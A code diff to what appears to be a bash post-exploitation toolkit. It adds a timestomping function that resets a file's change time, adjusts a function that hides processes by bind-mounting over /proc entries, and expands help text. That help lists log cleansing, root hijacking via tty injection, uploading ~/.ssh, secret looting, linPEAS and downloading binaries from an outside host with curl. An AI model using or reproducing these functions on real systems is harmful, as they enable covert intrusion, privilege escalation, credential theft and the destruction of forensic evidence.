@@ -104,6 +104,12 @@ notime() {
     date --set="$now" >/dev/null || return
 }
 
+# Set the ctime to the file's mtime
+ctime() {
+    local fn="${1}"
+
+    notime "${fn}" chmod --reference "${fn}" "${fn}"
+}
 
 # Presever mtime, ctime and birth-time as best as possible.
 # notime_cp <src> <dst>
@@ -278,10 +284,9 @@ lssr() {
     find "$@" -printf "%s %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
 }
 
-
 hide() {
     local _pid="${1:-$$}"
-    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
+    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv -f /etc/mtab.bak /etc/mtab; }
     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
     local _argstr
     for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
@@ -837,7 +842,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
         str="$(command -v bash)"
         [ -n "$str" ] && SHELL="${str}"
     }
-    [ -z "$UID" ] && UID="$(id -u)"
+    [ -z "$UID" ] && UID="$(id -u 2>/dev/null)"
     [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
     export _HS_HOME_ORIG="$HOME"
 
@@ -877,12 +882,24 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
     hs_init_dl
 }
 
-
-# Show common name of remote server
+# Show CN and SAN of remote server
 cn() {
+    local str
+    local x509
     _hs_dep openssl || return
     _hs_dep sed || return
-    timeout 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null  </dev/null | openssl x509 -noout -subject  2>/dev/null | sed '/^subject/s/^.*CN.*=[ ]*//g'
+
+    x509="$(timeout 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
+    # Extract CN
+    str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
+    [[ "$str" == "subject"* ]] && [[ "$str" != *"/CN"* ]] && {
+        str="$(echo "$str" | sed '/^subject/s/^.*CN.*=[ ]*//g')"
+        echo "$str"
+    }
+
+    # Extract SAN
+    str="$(echo "$x509" | openssl x509 -noout -ext subjectAltName 2>/dev/null | grep -F DNS: | sed 's/\s*DNS://g' | sed 's/[^-a-z0-9\.\*,]//g')"
+    echo "${str//,/$'\n'}"
 }
 
 _scan_single() {
@@ -952,12 +969,29 @@ hs_init_shell() {
     if [[ "$SHELL" == *"zsh" ]]; then
         PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
     else
-        PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+        if [ "$UID" -eq 0 ]; then
+            PS1='\[\033[31m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
+        else
+            PS1='\[\033[33m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
+            # PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+        fi
     fi
 }
 
+xhelp_scan() {
+    echo -e "\
+Scan all ports:
+    scan - 192.168.0.1
+Scan all ports on a range of IP.s
+    scan - 192.168.0.1-254"
+}
+
+# shellcheck disable=SC2120
+# Output help
 xhelp() {
-    # Output help
+
+    [[ "$1" == "scan" ]] && { xhelp_scan; return; }
+
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
@@ -971,6 +1005,7 @@ ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
+${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${CN}${CF}[find . -ctime -1]
 ${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
 ${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
 ${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
@@ -978,13 +1013,13 @@ ${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for 
 ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
-${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP
+${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[scan 22,443,445 10.0.0.1-254]
 ${CDC} hide <pid>                            ${CDM}Hide a process
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} lpe                                   ${CDM}Run linPEAS
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
-${CDC} bin                                   ${CDM}Download useful static binaries
+${CDC} bin                                   ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
